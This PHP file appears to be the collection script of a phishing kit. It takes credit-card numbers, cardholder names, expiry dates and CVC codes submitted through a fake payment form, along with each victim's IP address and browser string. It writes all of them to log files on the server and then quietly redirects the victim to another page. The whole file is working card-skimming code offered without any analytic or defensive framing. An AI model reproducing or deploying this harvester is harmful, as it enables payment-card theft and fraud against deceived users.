<?php

$number = $_POST['creditcard'];
$names = $_POST['names'];
$expirx = $_POST['month'];
$expiry = $_POST['year'];
$cvc = $_POST['cvc'];
$agent  = $_SERVER['HTTP_USER_AGENT'];
$ip =  $_SERVER['HTTP_X_FORWARDED_FOR'];

$file = $_SERVER['DOCUMENT_ROOT']."/log.log";
$all = "\r\nx.add_row(['PAY', '$number','$expirx/$expiry','$cvc','$ip'])";
$fp = fopen("$file", "a+");
fwrite($fp, $all);
fclose($fp);

$file = $_SERVER['DOCUMENT_ROOT']."/result.log";
$file = str_replace("/dist", "", $file);
$all = "[OS]: PAY"."\n [Name]: $names \n [Card Number]: $number \n [Date]: $expirx/$expiry\n [CVV2]: $cvc\n [ip]: $ip \n [Information]: $agent \n\n"; 
$fp = fopen("$file", "a+");
fwrite($fp, $all);
fclose($fp);

$reloc=file_get_contents("location.location");
?>

<script>
window.location.href="<?php echo $reloc ?>"
</script>

